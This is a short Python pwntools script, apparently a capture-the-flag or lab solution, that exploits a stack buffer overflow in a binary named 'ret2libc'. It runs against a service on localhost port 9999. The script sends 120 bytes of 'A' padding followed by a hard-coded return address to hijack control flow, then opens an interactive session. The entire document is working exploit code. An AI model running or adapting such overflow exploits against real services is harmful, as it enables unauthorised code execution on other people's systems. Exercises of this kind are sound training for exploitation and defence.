from pwn import *

p = remote('127.0.0.1', 9999)
# p = process('./ret2libc')  # it works on remote, but not on process

padding = 'A'*120
eip = p64(0x0000555555555165)

print padding + eip

p.sendline(padding + eip)
p.interactive()
